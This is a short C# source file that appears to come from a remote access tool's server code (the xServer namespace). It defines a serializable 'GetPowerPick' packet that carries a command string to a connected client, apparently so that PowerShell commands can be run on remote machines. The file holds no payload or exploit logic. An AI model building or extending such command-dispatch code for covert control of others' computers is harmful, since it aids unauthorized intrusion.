using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetPowerPick : IPacket
    {
            public string Command { get; set; }

            public GetPowerPick()
            {
            }

            public GetPowerPick(string command)
            {
                this.Command = command;
            }

            public void Execute(Client client)
            {
                client.Send(this);
            }
   }
}
